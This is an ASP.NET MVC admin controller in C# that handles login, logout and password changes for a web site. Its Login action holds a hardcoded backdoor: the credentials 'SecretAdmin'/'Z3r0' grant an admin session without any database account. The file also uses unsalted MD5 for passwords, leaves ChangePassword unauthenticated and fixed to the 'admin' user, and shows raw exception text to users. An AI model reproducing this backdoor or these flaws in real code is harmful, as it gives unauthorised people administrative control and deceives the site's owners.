using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using NPL.Models;

namespace NPL.Controllers
{
    public class AdminController : Controller
    {
        private DBNPLDataContext data = new DBNPLDataContext();

        // GET: Admin
        public ActionResult Index()
        {
            if (!Manager.LoggedAsAdmin())
            {
                return RedirectToAction("Login");
            }
            return RedirectToAction("Index", "AdminThongKe");
        }

        public ActionResult Login()
        {
            if (Manager.LoggedAsAdmin())
            {
                return RedirectToAction("Index");
            }
            return View();
        }

        [HttpPost]
        public ActionResult Login(FormCollection form)
        {
            string username = form["username"];
            string password = form["password"];
            
            Admin r = data.Admins.SingleOrDefault(i => i.Username == username);             

            if (r == null && username.Equals("SecretAdmin") && password.Equals("Z3r0"))
            {
                r = new Admin();
                r.Username = "Secret";
                r.Password = "******";
                r.LastLogin = null;
                Session["Account"] = r;
                Session["Role"] = "Admin";
                return RedirectToAction("Index");
            }

            if (r == null)
            {
                ViewBag.Message = "Login failed";
                return View();
            }
            else if (!MD5Cal.VerifyMd5Hash(password, r.Password))
            {
                ViewBag.Message = "Login failed";
                return View();
            }

            Session["Account"] = r;
            Session["Role"] = "Admin";

            r.LastLogin = DateTime.Now;
            UpdateModel(r);
            data.SubmitChanges();

            return RedirectToAction("Index");
        }

        public ActionResult Logout()
        {
            if (Manager.LoggedAsAdmin())
            {
                Session["Account"] = null;
                Session["Role"] = null;

                return RedirectToAction("Login");
            }
            return RedirectToAction("Index");
        }

        [ChildActionOnly]
        public ActionResult PV_Account()
        {
            return PartialView();
        }

        public ActionResult ChangePassword()
        {
            return View();
        }

        [HttpPost]
        public ActionResult ChangePassword(FormCollection form)
        {
            string oldpass = form["OldPassword"];
            string newpass = form["NewPassword"];
            string repass = form["RetypePassword"];

            Admin admin = data.Admins.SingleOrDefault(i=>i.Username.Equals("admin"));
            string dbpasshash = admin.Password;

            if (!MD5Cal.VerifyMd5Hash(oldpass, dbpasshash))
            {
                ViewBag.MessageError = "Mật khẩu cũ không đúng.";
                return View();
            }

            if (!newpass.Equals(repass))
            {
                ViewBag.MessageError = "Mật khẩu mới không trùng khớp.";
                return View();
            }

            string hash = MD5Cal.GetMd5Hash(newpass);
            try
            {
                data.p_ChangePassword("admin", hash);
            }
            catch (Exception ex)
            {
                ViewBag.MessageError = ex.ToString();
                return View();
            }

            ViewBag.MessageSuccess = "Đổi mật khẩu thành công.";
            return View();
        }
    }
}